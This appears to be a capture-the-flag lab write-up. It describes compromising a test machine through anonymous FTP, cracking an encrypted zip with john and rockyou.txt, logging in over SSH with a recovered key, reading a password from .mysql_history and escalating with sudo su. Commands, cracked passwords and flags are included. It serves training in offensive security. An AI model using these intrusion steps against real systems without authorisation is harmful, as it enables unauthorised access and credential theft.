First I scanned the machine for open ports using nmap
```
nmap -sV 192.168.103.107
```
Then I attempted to access ftp as the user anonymous. I successfully gained access to the ftp port because 
anonymous login was enabled.

commands used after access:
```
ls -al 
```
```
mget *.zip
```
The zip files were encrypted and so I decided to use john to decrypt the folders.
Of the folders decrypted tom was the most useful user to access.

Command used to create the hash to crack:
```
zip2john tom.zip > tom.hash
```
Command used to crack the hash:
```
john --worlist=rockyou.txt tom.hash
```
Password found for user tom was 
```
iubire
```
After unzipping the folder I received an id_rsa ssh key that I then used to gain initial access to the machine and 
found the first flag.
commands used to gain initial foothold:
```
chmod 400 id_rsa
ssh -i id_rsa tom@192.168.103.107
ls -la
```
user flag: 5b943003d8c7ddfe47c0bc08091889d6

after finding the user flag I found a file '.mysql_history' which contained the password(xx11yy22!)
which then allowed me to use the command 
```
sudo -l
```
which told me that tom could run all commands on the box.
Since I could use all commands I used the command to give me root access
```
sudo su
```
which then allowed me  to cd into the root folder and gaine the root flag

root flag: 7a62883dd2c457e9b9b6f8f26028a710

The machine is fully compromised and actions are no longer required.



